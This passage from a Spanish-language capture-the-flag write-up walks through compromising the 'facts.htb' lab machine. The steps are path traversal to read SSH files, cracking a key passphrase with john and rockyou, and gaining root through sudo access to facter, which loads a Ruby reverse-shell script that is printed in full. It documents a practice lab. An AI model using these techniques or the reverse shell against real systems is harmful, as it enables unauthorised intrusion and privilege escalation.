> El archivo `authorized_keys` es un archivo de texto utilizado en servidores y sistemas (generalmente Linux, Unix o macOS) para gestionar el acceso seguro a través del protocolo `SSH (Secure Shell)`.
> 
> Este archivo contiene la clave pública permitida para conectarse al servidor SSH.
{: .notice--info}

``` bash
curl -sL 'http://facts.htb/admin/media/download_private_file?file=../../../home/trivia/.ssh/authorized_keys' -b "$COOKIES" | tee trivia_ed_25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII53fgz/mVxsXY56Na+PJ2s/ImqvyTJ8CvShatwOAgIe
```

Al intentar conectarnos por `ssh`, el servidor nos solicitará una contraseña para proceder 

``` bash
ssh -i trivia_id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519': 
```


## SSH Key Cracking

Podemos intentar crackear esta clave privada para extraer este `passphrase`. Sin embargo `john` no puede trabajar directamente con el formato de clave SSH.

Podemos utilizar herramientas como `ssh2john` para extraer un hash derivado de la contraseña que está cifrando la clave SSH

``` bash
ssh2john.py trivia_id_ed25519 > hash.txt
```

Lanzaremos la herramienta `john` para intentar descifrar este hash resultante

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=ssh
...
<SNIP>
...
dragonballz      (id_ed25519)     
1g 0:00:04:54 DONE (2026-02-03 11:05) 0.003392g/s 10.86p/s 10.86c/s 10.86C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


## Shell as `trivia`

Iniciaremos una conexión a través de `ssh` hacia la máquina, empleando la clave privada como archivo de identidad con el parámetro `-i`

~~~ bash
ssh -i trivia_ed_25519 -oStrictHostKeyChecking=no trivia@facts.htb 
Enter passphrase for key 'trivia_ed_25519': 
Last login: Wed May 13 13:08:02 UTC 2026 from 10.10.14.3 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64) 

<SNIP>

trivia@facts:~$ 
trivia@facts:~$ export TERM=xterm
~~~

Ya podremos ver la flag del usuario sin privilegios

``` bash
trivia@facts:~$ cat /home/william/user.txt 
be9...
```
<br>


# Escalada de Privilegios
---
## Abusing Sudoers Privileges - `facter`

Al listar posibles privilegios configurados con `sudo`, veremos que podemos ejecutar la herramienta `facter` como cualquier usuario sin proporcionar contraseña

~~~ bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
~~~

### Exploiting

Afortunadamente, [`GTFOBins`](https://gtfobins.linuxsec.org/gtfobins/facter/) posee una publicación que contempla esta herramienta. 

Podemos utilizar un script malicioso en `ruby` que ejecute una acción que nos permita ganar acceso, en este caso opté por ejecutar una reverse shell hacia mi IP

``` bash
#!/usr/bin/env ruby
# syscall 33 = dup2 on 64-bit Linux
# syscall 63 = dup2 on 32-bit Linux
# test with nc -lvp 443 

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 443, '127.0.0.1'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
```

> No olvidemos iniciar un listener por el puerto que definimos en el script, en mi caso el puerto `443`: `nc -lvnp 443`.
{: .notice--danger}

### Root Time

Ejecutaremos la herramienta `facter` usando la flag `--custom-dir`, considerando que el script malicioso está en una ruta como `/tmp`

``` bash
trivia@facts:~$ sudo facter --custom-dir=/tmp x
```

Desde nuestro listener recibiremos una consola como el usuario `root`

``` bash
Connection from 10.129.23.199:42066
# id
uid=0(root) gid=0(root) groups=0(root)
```

Ya podremos ver la última flag ubicada en el directorio `/root`

``` bash
root@facts:/home/trivia# cat ~/root.txt
830...
```

Gracias por leer, a continuación te dejo la cita del día.

> Example has more followers than reason.
> — Christian Bovee
{: .notice--info}
